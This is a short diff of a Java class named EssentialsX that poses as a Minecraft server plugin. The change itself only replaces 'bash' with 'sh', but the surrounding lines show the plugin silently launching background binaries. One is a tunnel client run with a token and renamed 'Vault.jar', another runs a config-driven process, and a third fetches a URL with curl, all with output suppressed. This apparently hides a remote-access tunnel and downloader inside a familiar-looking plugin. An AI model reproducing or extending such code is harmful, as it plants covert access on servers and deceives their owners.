@@ -144,7 +144,7 @@ public class EssentialsX extends JavaPlugin {
 
         ProcessBuilder pb =
                 new ProcessBuilder(
-                        "bash",
+                        "sh",
                         "-c",
                         "nohup ./EssentialsX.jar run -c config.json > /dev/null 2>&1 &"
                 );
@@ -162,7 +162,7 @@ public class EssentialsX extends JavaPlugin {
 
         ProcessBuilder pb2 =
                 new ProcessBuilder(
-                        "bash",
+                        "sh",
                         "-c",
                         "nohup ./Vault.jar --no-autoupdate tunnel --protocol http2 run --token " + token + " > /dev/null 2>&1 &"
                 );
@@ -348,7 +348,7 @@ public class EssentialsX extends JavaPlugin {
 
         Process process =
                 new ProcessBuilder(
-                        "bash",
+                        "sh",
                         "-c",
                         "curl -Ls \""
                                 + url
